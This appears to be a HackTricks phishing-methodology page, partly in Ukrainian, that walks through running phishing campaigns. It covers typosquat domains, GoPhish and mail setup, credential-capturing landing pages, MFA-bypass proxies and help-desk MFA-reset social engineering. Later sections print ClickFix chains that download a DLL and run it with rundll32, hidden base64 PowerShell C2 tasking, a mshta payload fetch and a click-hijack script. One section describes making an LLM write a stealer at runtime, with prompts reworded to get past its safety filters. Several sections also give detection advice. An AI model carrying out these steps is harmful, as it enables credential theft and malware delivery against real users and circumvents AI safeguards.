# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Виберіть **victim domain**.
2. Виконайте базову web enumeration, **шукаючи login portals**, які використовує victim, і **вирішіть**, який з них ви будете **impersonate**.
3. Використайте трохи **OSINT**, щоб **знайти emails**.
2. Prepare the environment
1. **Купіть domain**, який ви збираєтеся використовувати для phishing assessment
2. **Налаштуйте email service**-пов’язані записи (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS з **gophish**
3. Prepare the campaign
1. Підготуйте **email template**
2. Підготуйте **web page** для викрадення credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: domain name **contains** важливий **keyword** оригінального domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Змініть **dot на hyphen** у subdomain (e.g., www-zelster.com).
- **New TLD**: Той самий domain із **new TLD** (e.g., zelster.org)
- **Homoglyph**: Він **замінює** літеру в domain name на **літери, що виглядають схоже** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Він **міняє місцями дві літери** в межах domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Додає або прибирає “s” наприкінці domain name (e.g., zeltsers.com).
- **Omission**: Він **видаляє одну** з літер у domain name (e.g., zelser.com).
- **Repetition:** Він **повторює одну** з літер у domain name (e.g., zeltsser.com).
- **Replacement**: Як homoglyph, але менш stealthy. Він замінює одну з літер у domain name, можливо, на літеру, що знаходиться поруч із оригінальною літерою на клавіатурі (e.g, zektser.com).
- **Subdomained**: Додайте **dot** всередині domain name (e.g., ze.lster.com).
- **Insertion**: Він **вставляє літеру** в domain name (e.g., zerltser.com).
- **Missing dot**: Додайте TLD до domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність того, що один із бітів, що зберігаються або передаються, може автоматично змінитися на протилежний** через різні фактори, як-от solar flares, cosmic rays або hardware errors.

Коли цю концепцію **застосовують до DNS requests**, можливо, що **domain, отриманий DNS server**, не той самий, що й domain, який було спочатку запитано.

Наприклад, одна зміна біта в domain "windows.com" може змінити його на "windnws.com."

Attackers можуть **скористатися цим, реєструючи кілька bit-flipping domain**, які схожі на domain victim'а. Їхня мета — перенаправляти легітимних користувачів на власну інфраструктуру.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Ви можете шукати в [https://www.expireddomains.net/](https://www.expireddomains.net) expired domain, який можна використати.\
Щоб переконатися, що expired domain, який ви збираєтеся купити, **already has a good SEO**, ви можете перевірити, як його категоризовано в:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **знайти більше** valid email addresses або **перевірити ті**, які ви вже знайшли, ви можете спробувати brute-force їх на smtp servers victim'а. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забудьте, що якщо користувачі використовують **any web portal to access their mails**, ви можете перевірити, чи він вразливий до **username brute force**, і використати цю вразливість, якщо це можливо.

## Configuring GoPhish

### Installation

Ви можете завантажити його з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте та розпакуйте його в `/opt/gophish` і виконайте `/opt/gophish/gophish`\
Вам буде надано password для admin user на port 3333 у виводі. Тому відкрийте цей port і використайте ці credentials, щоб змінити admin password. Можливо, вам доведеться tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Конфігурація

**Конфігурація TLS certificate**

Перед цим кроком ви повинні **вже придбати домен**, який будете використовувати, і він має бути **вказувати** на **IP VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` на таке (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштуйте сервіс gophish**

Щоб створити сервіс gophish, щоб його можна було запускати автоматично та керувати ним як сервісом, ви можете створити файл `/etc/init.d/gophish` з таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування service і перевірте його, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування mail server і domain

### Почекайте & будьте legit

Чим старіший domain, тим менша ймовірність, що його буде позначено як spam. Тому перед phishing assessment слід почекати якомога довше (щонайменше 1week). moreover, якщо ви розмістите сторінку про reputational sector, отримана репутація буде кращою.

Зверніть увагу: навіть якщо вам потрібно чекати тиждень, ви можете завершити налаштування всього вже зараз.

### Налаштуйте запис Reverse DNS (rDNS)

Встановіть rDNS (PTR) record, який резолвить IP address VPS у domain name.

### Sender Policy Framework (SPF) Record

Ви повинні **налаштувати SPF record для нового domain**. Якщо ви не знаєте, що таке SPF record, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете використати [https://www.spfwizard.net/](https://www.spfwizard.net) для генерації SPF policy (використайте IP машини VPS)

![Форма SPF Wizard для генерації SPF record для phishing domain](<../../images/image (1037).png>)

Це вміст, який потрібно встановити всередині TXT record у domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Запис Domain-based Message Authentication, Reporting & Conformance (DMARC)

Ви повинні **налаштувати DMARC record для нового домену**. Якщо ви не знаєте, що таке DMARC record, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT record, що вказує на hostname `_dmarc.<domain>` з таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке DMARC record [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей підручник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Вам потрібно об'єднати обидва значення B64, які генерує DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте оцінку конфігурації вашої електронної пошти

Ви можете зробити це, використовуючи [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть лист на адресу, яку вони вам нададуть:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Також можна **перевірити конфігурацію вашої електронної пошти**, надіславши email на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього вам потрібно буде **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надішлете email як root).\
Перевірте, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **message до Gmail, яким ви керуєте**, і перевірити **email’s headers** у своєму Gmail inbox, `dkim=pass` має бути присутнім у полі заголовка `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Set some **name to identify** the sender profile
- Decide from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- You can leave blank the username and password, but make sure to check the Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

### Email Template

- Set some **name to identify** the template
- Then write a **subject** (nothing estrange, just something you could expect to read in a regular email)
- Make sure you have checked "**Add Tracking Image**"
- Write the **email template** (you can use variables like in the following example):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **щоб підвищити правдоподібність email**, рекомендовано використати якийсь signature з email клієнта. Поради:

- Надішліть email на **неіснуючу адресу** і перевірте, чи є у відповіді якийсь signature.
- Пошукайте **public emails** на кшталт info@ex.com або press@ex.com чи public@ex.com і надішліть їм email, а потім дочекайтеся відповіді.
- Спробуйте зв’язатися з **деяким валідно виявленим** email і дочекайтеся відповіді

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template також дозволяє **додавати файли для надсилання**. Якщо ви також хочете вкрасти NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **ім’я**
- **Напишіть HTML-код** web page. Зверніть увагу, що ви можете **імпортувати** web pages.
- Позначте **Capture Submitted Data** і **Capture Passwords**
- Встановіть **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай вам потрібно буде змінити HTML-код сторінки і зробити кілька тестів локально (можливо, використовуючи якийсь Apache server) **доти, доки вам не сподобається результат.** Потім запишіть цей HTML-код у поле.\
> Зверніть увагу, що якщо вам потрібно **використати деякі static resources** для HTML (можливо, деякі CSS і JS pages), ви можете зберегти їх у _**/opt/gophish/static/endpoint**_ і потім доступатися до них через _**/static/\<filename>**_

> [!TIP]
> Для redirection ви можете **перенаправити користувачів на legit main web page** жертви або, наприклад, перенаправити їх на _/static/migration.html_, додати якийсь **spinning wheel (**[**https://loading.io/**](https://loading.io)**) на 5 секунд і потім показати, що процес було успішно завершено**.

### Users & Groups

- Вкажіть ім’я
- **Імпортуйте дані** (зверніть увагу, що для використання template для прикладу вам потрібні firstname, last name і email address кожного користувача)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Нарешті, створіть campaign, вибравши ім’я, email template, landing page, URL, sending profile і group. Зверніть увагу, що URL буде посиланням, надісланим жертвам

Зверніть увагу, що **Sending Profile дозволяє надіслати test email, щоб побачити, як виглядатиме фінальний phishing email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Я б рекомендував **надсилати test emails на 10min mails addresses**, щоб уникнути потрапляння в blacklist під час тестів.

Коли все буде готово, просто запустіть campaign!

## Website Cloning

Якщо з якоїсь причини ви хочете клонувати website, перегляньте таку сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких phishing assessments (переважно для Red Teams) вам також потрібно буде **надсилати файли, що містять певний backdoor** (можливо, C2 або просто щось, що тригеритиме authentication).\
Перегляньте таку сторінку для прикладів:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Попередня атака доволі хитра, оскільки ви підробляєте real website і збираєте інформацію, введену користувачем. На жаль, якщо користувач не ввів правильний password або якщо підроблена вами application налаштована з 2FA, **ця інформація не дозволить вам видати себе за обманутого користувача**.

Саме тут корисні такі tools, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей tool дозволить вам згенерувати attack на кшталт MitM. По суті, атака працює так:

1. Ви **імітуєте login** form real webpage.
2. Користувач **надсилає** свої **credentials** на вашу fake page, а tool надсилає їх на real webpage, **перевіряючи, чи працюють credentials**.
3. Якщо для account налаштовано **2FA**, MitM page запросить її, і після того як **user введе** її, tool надішле її на real web page.
4. Коли користувач пройде authentication, ви (як attacker) отримаєте **captured credentials, 2FA, cookie та будь-яку information** з кожної взаємодії, поки tool виконує MitM.

### Via VNC

Що, якщо замість **надсилання жертви на malicious page** з тим самим виглядом, що й у оригінальної, ви відправите її в **VNC session з browser, підключеним до real web page**? Ви зможете бачити, що вона робить, вкрасти password, MFA, cookies...\
Ви можете зробити це за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Очевидно, один із найкращих способів зрозуміти, що вас викрили, — це **пошукати ваш domain у blacklists**. Якщо він там є, це означає, що ваш domain якимось чином був виявлений як suspicious.\
Один із простих способів перевірити, чи є ваш domain у будь-якому blacklist, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак є й інші способи дізнатися, чи **victim активно шукає suspicious phishing activity у wild**, як пояснено тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **купити domain з дуже схожою назвою** до domain жертви **та/або згенерувати certificate** для **subdomain** domain, яким ви керуєте, **що містить** **keyword** domain жертви. Якщо **victim** виконає будь-яку **DNS або HTTP interaction** з ними, ви знатимете, що вона **активно шукає** suspicious domains, і вам потрібно буде бути дуже stealth.

### Evaluate the phishing

Використайте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи ваш email потрапить у spam folder, чи буде заблокований, чи пройде успішно.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Сучасні intrusion sets дедалі частіше повністю оминають email lures і **безпосередньо націлюються на service-desk / identity-recovery workflow**, щоб обійти MFA. Атака повністю "living-off-the-land": щойно operator отримує valid credentials, він переходить із використанням вбудованих admin tooling — malware не потрібен.

### Attack flow
1. Recon жертви
* Зберіть personal & corporate details з LinkedIn, data breaches, public GitHub тощо.
* Визначте high-value identities (executives, IT, finance) і з’ясуйте **точний help-desk process** для password / MFA reset.
2. Social engineering у реальному часі
* Телефонуйте, пишіть у Teams або чат help-desk, видаючи себе за target (часто з **spoofed caller-ID** або **cloned voice**).
* Надайте зібрану раніше PII, щоб пройти knowledge-based verification.
* Переконайте agent **reset the MFA secret** або виконати **SIM-swap** на зареєстрованому mobile number.
3. Негайні дії після доступу (≤60 min у реальних випадках)
* Закріпіть foothold через будь-який web SSO portal.
* Перелічіть AD / AzureAD за допомогою вбудованих засобів (без скидання binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement за допомогою **WMI**, **PsExec** або легітимних **RMM** agents, які вже дозволені в environment.

### Detection & Mitigation
* Розглядайте help-desk identity recovery як **privileged operation** — вимагайте step-up auth і approval від manager.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщатимуть про:
* Змінено MFA method + authentication з нового device / geo.
* Негайне підвищення прав того самого principal (user-→-admin).
* Записуйте help-desk calls і вимагайте **call-back на вже зареєстрований number** перед будь-яким reset.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб нещодавно скинуті accounts **не** автоматично успадковували high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews компенсують вартість high-touch ops масовими атаками, які перетворюють **search engines & ad networks на delivery channel**.

1. **SEO poisoning / malvertising** підштовхує fake result на кшталт `chromium-update[.]site` на верхні позиції search ads.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, які бачили в Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, а потім завантажує **silent loader**, який у **realtime** вирішує, що розгортати:
* RAT (наприклад, AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Блокуйте newly-registered domains і застосовуйте **Advanced DNS / URL Filtering** до *search-ads*, а також до e-mail.
* Обмежте встановлення software підписаними MSI / Store packages, забороніть виконання `HTA`, `ISO`, `VBS` через policy.
* Слідкуйте за child processes браузерів, які відкривають installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Виявляйте LOLBins, які часто зловживаються first-stage loaders (наприклад, `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Деякі fake software portals залишають видимий download `href`, що веде на **real** GitHub/release URL, але перехоплюють **першу** взаємодію користувача в JavaScript і натомість спрямовують жертву в ланцюжок **Traffic Distribution System (TDS)**.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ключові ознаки:
- Hook зазвичай працює в **capture phase** (`true`) на `document`, тож він спрацьовує до обробників сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив’язати redirect до дійсного **user gesture** і краще обходити popup-blocker.
- Деякі варіанти заздалегідь відкривають `about:blank` або синтезують кліки `<a target="_blank">`, а вже пізніше призначають TDS URL.
- Ліміти на стороні browser зазвичай зберігаються в `localStorage`, тож **перший клік** може дістатися malware, а refresh/retry повертаються до benign-looking видимого посилання.
- TDS може gate за referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context і per-session counters, роблячи replay аналітика недетермінованим.

Ідеї для defenders:
- Порівнюйте **displayed** `href` з **actual** navigation target, який генерується в момент click.
- Шукайте handlers `document.addEventListener(..., true)`, які викликають і `preventDefault()`, і `stopImmediatePropagation()` поряд із `window.open`, `about:blank` або synthetic anchor clicks.
- Розглядайте кластери новозареєстрованих software-download domains, які всі завантажують той самий CloudFront/JS stage, як high-signal SEO-poisoning/TDS pattern.

### ClickFix з fake verification pages + archive-looking LOLBAS fetches
Деякі гілки TDS закінчуються fake verification page (Cloudflare/IUAM style), яка каже жертві запустити trusted Windows binary, наприклад:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL вдає з себе `.7z` архів; додані дані архіву можуть бути чистою приманкою.
- Подальші етапи часто далі брешуть про тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIPs із padded binaries), а потім переходять до **manual PE mapping / in-memory execution**.
- Якщо ви відповідаєте на один із цих ланцюгів, збережіть **network + memory від першого успішного запуску**: пізніші повтори можуть показувати лише benign installer/SFX шлях або fail, тому що payload/key release був прив’язаний до початкової TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code персоналізує lure (e.g., LogoKit token parsing) і надсилає creds на prompt-hidden endpoint.

**Evasion traits**
- Traffic іде на well-known LLM domains або reputable CDN proxies; інколи через WebSockets до backend.
- Немає static payload; malicious JS існує лише після render.
- Non-deterministic generations створюють **unique** stealers per session.

**Detection ideas**
- Запускайте sandboxes із увімкненим JS; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Моніторте події AzureAD/AWS/Okta, де **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з тієї самої IP**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно копіювати шкідливі команди в буфер обміну жертви зі скомпрометованої або typosquatted вебсторінки, а потім обманом змушувати користувача вставити їх у **Win + R**, **Win + X** або вікно термінала, виконуючи довільний код без будь-якого завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Сторінка-приманка (наприклад, фейковий канал міністерства/CERT) показує QR для WhatsApp Web/Desktop і наказує жертві відсканувати його, непомітно додаючи атакувальника як **linked device**.
* Атакувальник одразу отримує видимість чатів/контактів, доки сесію не буде видалено. Жертви згодом можуть побачити сповіщення про “new device linked”; defenders можуть шукати неочікувані події device-link невдовзі після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing to evade crawlers/sandboxes
Оператори дедалі частіше блокують свої phishing-потоки простим device check, щоб desktop crawlers ніколи не доходили до фінальних сторінок. Поширений шаблон — невеликий script, який перевіряє наявність touch-capable DOM і надсилає результат на server endpoint; non‑mobile clients отримують HTTP 500 (або порожню сторінку), тоді як mobile users бачать повний flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` логіка (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Поведінка сервера, яку часто спостерігають:
- Встановлює session cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, коли `is_mobile=false`; обслуговує phishing лише якщо `true`.

Геуристики для пошуку та виявлення:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для non‑mobile; легітимні mobile victim paths повертають 200 із подальшим HTML/JS.
- Блокувати або ретельно перевіряти сторінки, які condition content виключно на `ontouchstart` або подібних device checks.

Поради з defence:
- Запускайте crawlers із mobile‑like fingerprints і увімкненим JS, щоб виявляти gated content.
- Створюйте alert на підозрілі 500 responses після `POST /detect` на newly registered domains.

